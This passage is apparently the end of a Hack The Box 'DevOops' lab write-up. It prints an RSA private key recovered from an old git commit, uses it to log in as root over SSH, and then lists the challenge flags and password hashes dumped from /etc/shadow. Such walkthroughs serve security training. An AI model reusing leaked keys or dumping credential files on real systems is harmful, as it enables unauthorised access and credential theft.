+8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
+RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
+qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
+T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
+bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
 -----END RSA PRIVATE KEY-----
-
```

Reused ssh key found inside an old git commit:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/DevOops/loot]
└─$ nano old.key

┌──(kali㉿kali)-[~/…/HTB/box/DevOops/loot]
└─$ cat old.key
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----

┌──(kali㉿kali)-[~/…/HTB/box/DevOops/loot]
└─$ chmod 600 old.key

┌──(kali㉿kali)-[~/…/HTB/box/DevOops/loot]
└─$ ssh blogfeed@10.10.10.91 -i old.key
blogfeed@10.10.10.91's password:

┌──(kali㉿kali)-[~/…/HTB/box/DevOops/loot]
└─$ ssh root@10.10.10.91 -i old.key
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
root@gitter:~# id && hostname
uid=0(root) gid=0(root) groups=0(root)
gitter
d4fe1e7f7187407eebdd3209cb1ac7b3
ens33     Link encap:Ethernet  HWaddr 00:50:56:b9:b3:fe
          inet addr:10.10.10.91  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb9:b3fe/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb9:b3fe/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2586 errors:0 dropped:28 overruns:0 frame:0
          TX packets:1950 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:227997 (227.9 KB)  TX bytes:272385 (272.3 KB)
          Interrupt:19 Base address:0x2000

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:200 errors:0 dropped:0 overruns:0 frame:0
          TX packets:200 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:15634 (15.6 KB)  TX bytes:15634 (15.6 KB)
```

![Pasted image 20210527182102.png](../../zzz_res/attachments/Pasted_image_20210527182102.png)

# Trophy

>[!quote]
> Anything out there is vulnerable to attack given enough time and resources.
> 
>\- Kevin Mitnick

>[!success]
>**User.txt**
>c5808e1643e801d40f09ed87cdecc67b

>[!success]
>**Root.txt**
>d4fe1e7f7187407eebdd3209cb1ac7b3

**/etc/shadow**

```bash
root@gitter:~# cat /etc/shadow | grep '\$'
root:$6$GPJUCRKo$UlI8QT0C3it3IJs2u3DwNf9tHlMz0Jo.4Obidn8u/3e8Qc9GGQqvZUDi.lj7/TaeK4OOZce2WUAf.Aplshclm1:17616:0:99999:7:::
osboxes:$6$gCLT06gi$E2gHnMhqtMXs4svcrtZtE56RZXaudCjiUCiPwrPWuHgykp6VRhiaoFeYU.K9nlvsU/scViSoX6ZKFSwf7dCdt1:17616:0:99999:7:::
git:$6$BaYIX5OI$V8/ON4zqbpYjcpnsrJGfHFPrbyLmNj.FSZ/3Bk0uhNrayPGJvu6IR1uzeeh8hzB98vGS.Tpu/mYvD5fbATVMJ0:17616:0:99999:7:::
roosa:$6$N4OqXtks$xv.BMv9cYUiFk8LdXaLCwe4s33SIo4VmZBvvgdt7KBA/YwxM8F3ayUflTYHva8OuKAuYEcGdvugIT94qPkj9L.:17616:0:99999:7:::
blogfeed:$6$yr5pj75z$aJV9JOuxgybTLDjIe1g9VaH3Nnu1ysl0TYVQq9Jth6aDBf1OQSyXisCZ5YRf2vfVruY9xT.x3nvmGExDDq9c71:17609:0:99999:7:::
```